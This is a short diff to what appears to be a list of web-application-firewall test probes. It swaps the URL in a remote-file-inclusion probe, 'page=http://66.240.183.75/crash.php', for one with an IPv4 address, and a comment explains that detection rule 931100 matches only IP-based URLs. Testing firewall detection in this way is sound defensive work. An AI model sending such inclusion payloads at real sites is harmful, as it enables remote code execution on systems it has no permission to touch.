@@ -62,7 +62,8 @@ PROBES: list[dict[str, str]] = [
         "family": "rfi",
         "method": "GET",
         "path": PORTAL_PROBE_PATH,
-        "params": {"page": "http://evil.example/a.txt"},
+        # CRS 931100 (PL1) matches http(s):// + IPv4, not bare hostnames.
+        "params": {"page": "http://66.240.183.75/crash.php"},
         "expect_rule_prefix": "931",
     },
     {
